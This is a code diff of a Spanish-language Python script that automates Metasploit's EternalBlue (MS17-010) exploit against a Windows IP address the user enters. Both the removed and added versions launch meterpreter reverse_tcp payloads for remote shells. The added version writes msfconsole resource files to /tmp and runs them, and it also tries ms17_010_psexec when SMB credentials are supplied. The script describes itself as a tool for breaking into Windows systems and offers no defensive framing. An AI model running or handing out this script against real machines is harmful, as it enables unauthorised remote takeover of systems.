@@ -1,69 +1,80 @@
+#!/usr/bin/env python3
 import subprocess
-import sys
-from pymetasploit3.msfrpc import MsfRpcClient
+import os
 
-def install_dependencies():
-    try:
-        import pymetasploit3
-    except ImportError:
-        subprocess.check_call([sys.executable, "-m", "pip", "install", "pymetasploit3"])
-        import pymetasploit3
+def run_exploit(target_ip, local_ip, smb_user=None, smb_password=None):
+    # Crear archivo de recursos para Metasploit para exploit de 64 bits
+    msf_resource_script_64 = f"""
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOST {target_ip}
+set LHOST {local_ip}
+set payload windows/x64/meterpreter/reverse_tcp
+exploit
+exit
+"""
 
-def update_metasploit():
-    subprocess.run(["msfupdate"])
-    subprocess.run(["msfdb", "reinit"])
+    # Crear archivo de recursos para Metasploit para exploit de 32 bits
+    msf_resource_script_32 = f"""
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOST {target_ip}
+set LHOST {local_ip}
+set payload windows/meterpreter/reverse_tcp
+exploit
+exit
+"""
 
-def get_user_input(prompt):
-    return input(prompt)
+    resource_file_path_64 = '/tmp/msf_resource_64.rc'
+    with open(resource_file_path_64, 'w') as file:
+        file.write(msf_resource_script_64)
 
-def try_exploit(client, exploit_name, target_ip, local_ip, username=None, password=None):
-    exploit = client.modules.use('exploit', exploit_name)
-    exploit['RHOSTS'] = target_ip
-    exploit['LHOST'] = local_ip
-    if username and password:
-        exploit['SMBUser'] = username
-        exploit['SMBPass'] = password
-    payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
-    payload['LHOST'] = local_ip
-    exploit.execute(payload=payload)
-    print("Esperando a que el exploit se complete...")
-    # Aquí se debería implementar una mejor lógica de espera/verificación
-    time.sleep(5)
-    sessions = client.sessions.list
-    if len(sessions) > 0:
-        print("[+] Sesión creada, exploit fue exitoso!")
-        return True
-    print("[-] No se creó sesión con el exploit")
-    return False
+    resource_file_path_32 = '/tmp/msf_resource_32.rc'
+    with open(resource_file_path_32, 'w') as file:
+        file.write(msf_resource_script_32)
+    
+    # Ejecutar msfconsole con el archivo de recursos de 64 bits
+    print("Ejecutando Metasploit para el exploit de 64 bits...")
+    subprocess.run(['msfconsole', '-q', '-r', resource_file_path_64])  # '-q' para modo silencioso
+
+    # Ejecutar msfconsole con el archivo de recursos de 32 bits
+    print("Intentando con el exploit de 32 bits...")
+    subprocess.run(['msfconsole', '-q', '-r', resource_file_path_32])  # '-q' para modo silencioso
+
+    # Si se proporcionaron credenciales SMB, intentar usarlas en ambos exploits
+    if smb_user and smb_password:
+        print("Intentando con credenciales SMB...")
+        msf_resource_script_smb = f"""
+use exploit/windows/smb/ms17_010_psexec
+set RHOSTS {target_ip}
+set SMBUser {smb_user}
+set SMBPass {smb_password}
+set payload windows/meterpreter/reverse_tcp
+exploit
+exit
+"""
+        resource_file_path_smb = '/tmp/msf_resource_smb.rc'
+        with open(resource_file_path_smb, 'w') as file:
+            file.write(msf_resource_script_smb)
+
+        print("Ejecutando Metasploit con credenciales SMB...")
+        subprocess.run(['msfconsole', '-q', '-r', resource_file_path_smb])
 
 def main():
-    install_dependencies()
-    update_metasploit()
+    print("Bienvenido al script de explotación.")
+    print("Este script utiliza el exploit EternalBlue en Metasploit para vulnerar sistemas Windows.")
+    target_ip = input("Introduce la IP del objetivo: ")
+    local_ip = input("Introduce tu IP local (LHOST): ")
 
-    client = MsfRpcClient('msf', port=55553)
-    target_ip = get_user_input("Introduce la IP del objetivo: ")
-    local_ip = get_user_input("Introduce tu IP local (LHOST): ")
-    exploits = ['windows/smb/ms17_010_eternalblue', 'windows/smb/ms17_010_psexec']
-    
-    for exploit_name in exploits:
-        if try_exploit(client, exploit_name, target_ip, local_ip):
-            break
-        else:
-            print(f"El exploit {exploit_name} falló.")
-            if exploit_name == 'windows/smb/ms17_010_psexec':
-                print("Intentando con credenciales...")
-                username = get_user_input("Introduce el nombre de usuario: ")
-                password = get_user_input("Introduce la contraseña: ")
-                if try_exploit(client, exploit_name, target_ip, local_ip, username, password):
-                    break
-
-    # Si todos los exploits fallan, prueba con otros de la base de datos
+    # Solicitar credenciales SMB si es necesario
+    smb_option = input("¿Deseas agregar credenciales SMB para intentar la explotación? (Sí/No): ")
+    if smb_option.lower() == 'sí' or smb_option.lower() == 'si':
+        smb_user = input("Introduce el nombre de usuario SMB: ")
+        smb_password = input("Introduce la contraseña SMB: ")
     else:
-        print("Intentando con otros exploits disponibles...")
-        for module in client.modules.exploits:
-            if 'ms17_010' in module and module not in exploits:
-                if try_exploit(client, module, target_ip, local_ip):
-                    break
+        smb_user = None
+        smb_password = None
+    
+    # Ejecutar el exploit
+    run_exploit(target_ip, local_ip, smb_user, smb_password)
 
 if __name__ == "__main__":
     main()
